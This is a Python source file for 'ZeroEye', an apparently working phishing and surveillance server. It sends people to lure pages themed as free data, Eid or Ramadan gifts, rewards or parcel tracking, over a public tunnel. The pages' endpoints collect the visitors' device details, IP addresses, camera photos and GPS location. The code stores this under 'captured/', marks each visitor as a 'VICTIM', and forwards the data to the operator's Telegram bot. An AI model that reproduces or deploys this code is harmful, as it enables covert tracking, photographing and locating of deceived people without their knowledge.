#!/usr/bin/env python3
"""
ZeroEye v2.1.0 - Main Application
Professional reconnaissance tool with automated tunneling
"""

import os
import sys

# Virtual environment check - ADD THIS AT THE VERY TOP
def check_environment():
    """Check if we're running in the correct environment"""
    venv_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "zeroeye_venv")
    
    # Check if we're in the virtual environment
    in_venv = hasattr(sys, 'real_prefix') or (
        hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix
    )
    
    if not in_venv or not sys.prefix.startswith(venv_path):
        print("❌ Please run ZeroEye through the start script!")
        print("💡 Use: ./start.sh")
        print("💡 Or activate venv manually: source zeroeye_venv/bin/activate")
        sys.exit(1)

# Run environment check
check_environment()

# Now import other dependencies
import json
import time
import shutil
import atexit
from fastapi import FastAPI, UploadFile, File, Form
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.panel import Panel

from core.banner import get_banner
from core.bot import TelegramSender
from core.tunnel import TunnelManager

console = Console()
app = FastAPI(docs_url=None, redoc_url=None)
app.add_middleware(
    CORSMiddleware, 
    allow_origins=["*"], 
    allow_methods=["*"], 
    allow_headers=["*"]
)

# Ensure directories exist
for dir in ["static", "captured", "templates"]:
    if not os.path.exists(dir): 
        os.makedirs(dir)

app.mount("/static", StaticFiles(directory="static"), name="static")

CONFIG_FILE = "config.json"
CONFIG = {
    "telegram_enabled": False, 
    "bot_token": "", 
    "chat_id": "", 
    "template": "free_data"
}
bot = None
tunnel_manager = None

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            return None
    return None

def save_config(conf):
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(conf, f, indent=2)
        return True
    except:
        return False

def save_local(filename, data):
    try:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(f"captured/{filename}", "a", encoding='utf-8') as f:
            f.write(f"\n{'='*60}\nTimestamp: {timestamp}\n{'='*60}\n{data}\n\n")  # FIXED: Changed {'='=60} to {'='*60}
    except:
        pass

def cleanup():
    global tunnel_manager
    if tunnel_manager:
        tunnel_manager.stop_tunnel()

atexit.register(cleanup)

# FastAPI Routes
@app.get("/")
async def serve_index():
    path = f"templates/{CONFIG['template']}.html"
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f: 
            return HTMLResponse(f.read())
    return HTMLResponse("<h1>Template not found</h1>")

@app.post("/upload_sys")
async def receive_sys(data: str = Form(...)):
    try:
        info = json.loads(data)
        basic_info = info.get('basic', {})
        platform = basic_info.get('platform', 'Unknown')
        screen = basic_info.get('screen', {})
        screen_res = f"{screen.get('width', '?')}x{screen.get('height', '?')}"
        
        console.print(Panel(
            f"[bold green]🎯 VICTIM CONNECTED[/bold green]\n\n"
            f"[cyan]Device:[/cyan] {platform}\n"
            f"[cyan]Screen:[/cyan] {screen_res}\n"
            f"[cyan]Template:[/cyan] {CONFIG['template']}",
            title="System Intelligence",
            border_style="green"
        ))
        
        if bot:
            bot.send_message(f"🎯 *NEW VICTIM*\nDevice: {platform}\nScreen: {screen_res}")
        
        save_local("victims.txt", json.dumps(info, indent=2))
        return {"status": "ok"}
    except:
        return {"status": "error"}

@app.post("/upload_ip")
async def receive_ip(data: str = Form(...)):
    try:
        info = json.loads(data)
        ips = info.get('ips', [])
        for ip in ips:
            console.print(f"[green][+] IP: {ip}[/green]")
            if bot: 
                bot.send_message(f"🌐 *IP Address*\n`{ip}`")
            save_local("ip_logs.txt", f"IP: {ip}")
        return {"status": "ok"}
    except:
        return {"status": "error"}

@app.post("/upload_cam")
async def receive_cam(file: UploadFile = File(...)):
    try:
        filename = f"captured/cam_{int(time.time())}.jpg"
        with open(filename, "wb") as buffer: 
            shutil.copyfileobj(file.file, buffer)
        console.print(f"[green][+] Photo captured[/green]")
        if bot: 
            bot.send_photo(filename, caption="📸 Camera Capture")
        return {"status": "ok"}
    except:
        return {"status": "error"}

@app.post("/upload_location")
async def receive_location(data: str = Form(...)):
    try:
        info = json.loads(data)
        if 'latitude' in info:
            console.print(Panel(
                f"[bold yellow]📍 LOCATION[/bold yellow]\n\n"
                f"Lat: {info['latitude']}\nLon: {info['longitude']}",
                border_style="yellow"
            ))
            if bot:
                bot.send_message(f"📍 *Location*\nLat: {info['latitude']}\nLon: {info['longitude']}")
        save_local("location.txt", json.dumps(info, indent=2))
        return {"status": "ok"}
    except:
        return {"status": "error"}

def start_wizard():
    console.clear()
    console.print(get_banner())
    
    # Config loading
    saved_conf = load_config()
    global bot, CONFIG, tunnel_manager
    
    if saved_conf:
        console.print("\n[cyan]📁 Found saved configuration[/cyan]")
        if Prompt.ask("Use saved settings?", choices=["y", "n", "delete"], default="y") == "y":
            CONFIG.update(saved_conf)
            if CONFIG["telegram_enabled"] and CONFIG["bot_token"] and CONFIG["chat_id"]:
                bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
        else:
            saved_conf = None

    if not saved_conf:
        console.print("\n[bold yellow]🤖 Telegram Configuration[/bold yellow]")
        if Confirm.ask("Enable Telegram notifications?", default=True):
            CONFIG["telegram_enabled"] = True
            CONFIG["bot_token"] = Prompt.ask("Enter Bot Token")
            CONFIG["chat_id"] = Prompt.ask("Enter Chat ID")
            test_bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
            if Confirm.ask("Save these settings?", default=True):
                save_config(CONFIG)
            bot = test_bot

    # Template selection
    console.print("\n[bold cyan]🎨 Select Template[/bold cyan]")
    templates = {
        "1": ("🎁 Free Data", "free_data"),
        "2": ("🌙 Eid Gift", "eid"), 
        "3": ("🕌 Ramadan", "ramadan"),
        "4": ("🌍 Gulf Bundle", "gulf"),
        "5": ("🎁 Rewards", "rewards"),
        "6": ("📦 Tracking", "tracking")
    }
    
    for key, (name, _) in templates.items():
        console.print(f"  {key}. {name}")
    
    choice = Prompt.ask("Choose template", choices=list(templates.keys()), default="1")
    CONFIG["template"] = templates[choice][1]
    console.print(f"[green][✓] Selected: {templates[choice][0]}[/green]")

    # Start server
    port = 8080
    console.print(f"\n[green][*] Starting server on port {port}...[/green]")
    
    # Start tunnel - COMPLETELY AUTOMATED
    tunnel_manager = TunnelManager(port)
    console.print("[cyan][*] Establishing worldwide tunnel...[/cyan]")
    url = tunnel_manager.start_tunnel()
    
    console.print(Panel(
        f"[bold cyan]🚀 ZEROEYE v2.1.0 READY[/bold cyan]\n\n"
        f"[bold green]{url}[/bold green]\n\n"
        f"[yellow]📋 Send this link to your target[/yellow]\n"
        f"[green]✅ Worldwide tunnel active[/green]\n"
        f"[grey50]💡 Works from any country, any network[/grey50]",
        title="ZeroEye v2.1.0 - Professional",
        border_style="green"
    ))
    
    console.print("\n[cyan]🛡️  Waiting for targets... (Ctrl+C to stop)[/cyan]")
    
    try:
        uvicorn.run(app, host="0.0.0.0", port=port, log_level="error", access_log=False)
    except KeyboardInterrupt:
        console.print("\n[yellow][!] Shutting down...[/yellow]")
    finally:
        cleanup()

if __name__ == "__main__":
    start_wizard()
